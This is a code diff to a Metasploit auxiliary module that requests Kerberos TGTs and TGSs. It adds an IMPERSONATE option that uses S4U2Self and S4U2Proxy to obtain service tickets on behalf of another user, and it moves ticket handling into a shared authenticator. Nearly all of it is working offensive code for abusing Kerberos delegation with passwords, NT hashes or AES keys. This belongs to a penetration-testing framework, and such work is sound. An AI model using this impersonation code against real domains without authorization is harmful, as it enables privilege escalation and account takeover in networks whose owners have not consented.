@@ -55,6 +55,13 @@ class MetasploitModule < Msf::Auxiliary
             'The Service Principal Name, format is service_name/FQDN. Ex: cifs/dc01.mydomain.local'
           ],
           conditions: %w[ACTION == GET_TGS]
+        ),
+        OptString.new(
+          'IMPERSONATE', [
+            false,
+            'The user on whose behalf a TGS is requested (it will use S4U2Self/S4U2Proxy to request the ticket)',
+          ],
+          conditions: %w[ACTION == GET_TGS]
         )
       ]
     )
@@ -95,23 +102,32 @@ class MetasploitModule < Msf::Auxiliary
     validate_options
 
     send("action_#{action.name.downcase}")
+
+    report_service(
+      host: rhost,
+      port: rport,
+      proto: 'tcp',
+      name: 'kerberos',
+      info: "Module: #{fullname}, KDC for domain #{datastore['DOMAIN']}"
+    )
+  rescue ::Rex::Proto::Kerberos::Model::Error::KerberosError,
+         ::EOFError => e
+    msg = e.to_s
+    if e.respond_to?(:error_code) &&
+       e.error_code == ::Rex::Proto::Kerberos::Model::Error::ErrorCodes::KDC_ERR_PREAUTH_REQUIRED
+      msg << ' - Check the authentication-related options (PASSWORD, NTHASH or AESKEY)'
+    end
+    fail_with(Failure::Unknown, msg)
   end
 
-  def action_get_tgt
-    ticket_options = Rex::Proto::Kerberos::Model::KdcOptionFlags.from_flags(
-      [
-        Rex::Proto::Kerberos::Model::KdcOptionFlags::FORWARDABLE,
-        Rex::Proto::Kerberos::Model::KdcOptionFlags::RENEWABLE,
-        Rex::Proto::Kerberos::Model::KdcOptionFlags::CANONICALIZE,
-        Rex::Proto::Kerberos::Model::KdcOptionFlags::RENEWABLE_OK
-      ]
-    )
-    options = {
+  def init_authenticator(options = {})
+    options.merge!({
+      host: rhost,
       realm: datastore['DOMAIN'],
-      server_name: "krbtgt/#{datastore['DOMAIN']}",
-      client_name: datastore['USER'],
-      options: ticket_options
-    }
+      username: datastore['USER'],
+      framework: framework,
+      framework_module: self
+    })
     options[:password] = datastore['PASSWORD'] if datastore['PASSWORD'].present?
     if datastore['NTHASH'].present?
       options[:key] = [datastore['NTHASH']].pack('H*')
@@ -126,175 +142,58 @@ class MetasploitModule < Msf::Auxiliary
                         end
     end
 
-    tgt_result = send_request_tgt(options)
-    print_good("#{peer} - Received a valid TGT-Response")
+    Msf::Exploit::Remote::Kerberos::ServiceAuthenticator::Base.new(**options)
+  end
 
-    report_service(
-      host: rhost,
-      port: rport,
-      proto: 'tcp',
-      name: 'kerberos',
-      info: "Module: #{fullname}, KDC for domain #{options[:realm]}"
-    )
+  def action_get_tgt
+    print_status("#{peer} - Getting TGT for #{datastore['USER']}@#{datastore['DOMAIN']}")
 
-    cache = Rex::Proto::Kerberos::CredentialCache::Krb5Ccache.from_responses(
-      tgt_result.as_rep,
-      tgt_result.decrypted_part
-    )
-    path = store_loot(
-      'mit.kerberos.ccache',
-      'application/octet-stream',
-      rhost,
-      cache.encode,
-      nil,
-      loot_info(options)
-    )
-    print_status("#{peer} - TGT MIT Credential Cache saved on #{path}")
-
-    cache.credentials.first
-  rescue ::Rex::Proto::Kerberos::Model::Error::KerberosError,
-         ::EOFError => e
-    msg = e.to_s
-    if e.respond_to?(:error_code) &&
-       e.error_code == ::Rex::Proto::Kerberos::Model::Error::ErrorCodes::KDC_ERR_PREAUTH_REQUIRED
-      msg << ' - Check the authentication-related options (PASSWORD, NTHASH or AESKEY)'
-    end
-    fail_with(Failure::Unknown, "Error while requesting a TGT: #{e}")
+    authenticator = init_authenticator({ use_cached_credentials: false })
+    authenticator.authenticate({ tgt_only: true })
   end
 
   def action_get_tgs
-    credential = nil
     options = {
-      realm: datastore['DOMAIN'],
-      client_name: datastore['USER']
+      use_cached_credentials: datastore['KrbUseCachedCredentials'].nil? ? false : datastore['KrbUseCachedCredentials']
     }
+    authenticator = init_authenticator(options)
 
-    if datastore['KrbUseCachedCredentials']
-      # load a cached TGT
-      options[:server_name] = "krbtgt/#{datastore['DOMAIN']}"
-      credential = get_cached_credential(options)
-    end
-
-    if credential
-      print_status("#{peer} - Using cached credential for #{credential.server} #{credential.client}")
-    else
-      credential = action_get_tgt
-    end
-
-    begin
-      options[:server_name] = datastore['SPN']
-      request_tgs_from_tgt(credential, options)
-    rescue ::Rex::Proto::Kerberos::Model::Error::KerberosError,
-           ::EOFError => e
-      fail_with(Failure::Unknown, "Error while requesting a TGS: #{e}")
-    end
-  end
-
-  def loot_info(options = {})
-    info = []
-
-    info << "realm: #{options[:realm].upcase}" if options[:realm]
-    info << "serviceName: #{options[:server_name].downcase}" if options[:server_name]
-    info << "username: #{options[:client_name].downcase}" if options[:client_name]
-
-    info.join(', ')
-  end
-
-  def get_cached_credential(options = {})
-    return nil unless active_db?
-
-    now = Time.now.utc
-    host = report_host(workspace: myworkspace, host: rhost)
-    framework.db.loot(
-      workspace: myworkspace,
-      host: host,
-      ltype: 'mit.kerberos.ccache',
-      info: loot_info(options)
-    ).each do |stored_loot|
-      ccache = Rex::Proto::Kerberos::CredentialCache::Krb5Ccache.read(stored_loot.data)
-      # at this time Metasploit stores 1 credential per ccache file, so no need to iterate through them
-      credential = ccache.credentials.first
-
-      tkt_start = if credential.starttime == Time.at(0).utc
-                    credential.authtime
-                  else
-                    credential.starttime
-                  end
-      tkt_end = credential.endtime
-      return credential if tkt_start < now && now < tkt_end
-    end
-
-    nil
-  end
-
-  def request_tgs_from_tgt(credential, options)
-    now = Time.now.utc
-    expiry_time = now + 1.day
-
-    ticket = Rex::Proto::Kerberos::Model::Ticket.decode(credential.ticket.value)
-    session_key = Rex::Proto::Kerberos::Model::EncryptionKey.new(
-      type: credential.keyblock.enctype.value,
-      value: credential.keyblock.data.value
-    )
-    ticket_options = Rex::Proto::Kerberos::Model::KdcOptionFlags.from_flags(
-      [
-        Rex::Proto::Kerberos::Model::KdcOptionFlags::FORWARDABLE,
-        Rex::Proto::Kerberos::Model::KdcOptionFlags::RENEWABLE,
-        Rex::Proto::Kerberos::Model::KdcOptionFlags::CANONICALIZE,
-      ]
-    )
-
-    tgs_res = send_request_tgs(
-      req: build_tgs_request(
-        {
-          session_key: session_key,
-          subkey: nil,
-          checksum: nil,
-          ticket: ticket,
-          realm: options[:realm],
-          client_name: options[:client_name],
-          options: ticket_options,
-
-          body: build_tgs_request_body(
-            cname: nil,
-            server_name: options[:server_name],
-            server_type: Rex::Proto::Kerberos::Model::NameType::NT_SRV_INST,
-            realm: options[:realm],
-            etype: [ticket.enc_part.etype],
-            options: ticket_options,
-
-            # Specify nil to ensure the KDC uses the current time for the desired starttime of the requested ticket
-            from: nil,
-            till: expiry_time,
-            rtime: nil,
-
-            # certificate time
-            ctime: now
-          )
-        }
+    if datastore['IMPERSONATE'].present?
+      print_status("#{peer} - Getting TGS impersonating #{datastore['IMPERSONATE']}@#{datastore['DOMAIN']} (SPN: #{datastore['SPN']})")
+      sname = Rex::Proto::Kerberos::Model::PrincipalName.new(
+        name_type: Rex::Proto::Kerberos::Model::NameType::NT_UNKNOWN,
+        name_string: [datastore['USER']]
       )
-    )
+      credential = authenticator.request_tgt_only(options)
+      auth_options = {
+        sname: sname,
+        impersonate: datastore['IMPERSONATE'],
+        use_cache_tgt_only: true
+      }
+      tgs_ticket, _tgs_auth = authenticator.s4u2self(
+        credential,
+        auth_options.merge(store_credential_cache: false)
+      )
 
-    if tgs_res.msg_type == Rex::Proto::Kerberos::Model::KRB_ERROR
-      raise ::Rex::Proto::Kerberos::Model::Error::KerberosError.new(res: tgs_res)
+      auth_options[:sname] = Rex::Proto::Kerberos::Model::PrincipalName.new(
+        name_type: Rex::Proto::Kerberos::Model::NameType::NT_SRV_INST,
+        name_string: datastore['SPN'].split('/')
+      )
+      auth_options[:tgs_ticket] = tgs_ticket
+      auth_options.delete(:store_credential_cache)
+      authenticator.s4u2proxy(credential, auth_options)
+    else
+      print_status("#{peer} - Getting TGS for #{datastore['USER']}@#{datastore['DOMAIN']} (SPN: #{datastore['SPN']})")
+      sname = Rex::Proto::Kerberos::Model::PrincipalName.new(
+        name_type: Rex::Proto::Kerberos::Model::NameType::NT_SRV_INST,
+        name_string: datastore['SPN'].split('/')
+      )
+      auth_options = {
+        sname: sname,
+        use_cache_tgt_only: true
+      }
+      authenticator.authenticate(auth_options)
     end
-
-    print_good("#{peer} - Received a valid TGS-Response")
-
-    cache = extract_kerb_creds(
-      tgs_res,
-      session_key.value,
-      msg_type: Rex::Proto::Kerberos::Crypto::KeyUsage::TGS_REP_ENCPART_SESSION_KEY
-    )
-    path = store_loot(
-      'mit.kerberos.ccache',
-      'application/octet-stream',
-      rhost,
-      cache.encode,
-      nil,
-      loot_info(options)
-    )
-    print_status("#{peer} - TGS MIT Credential Cache saved to #{path}")
   end
 
 end
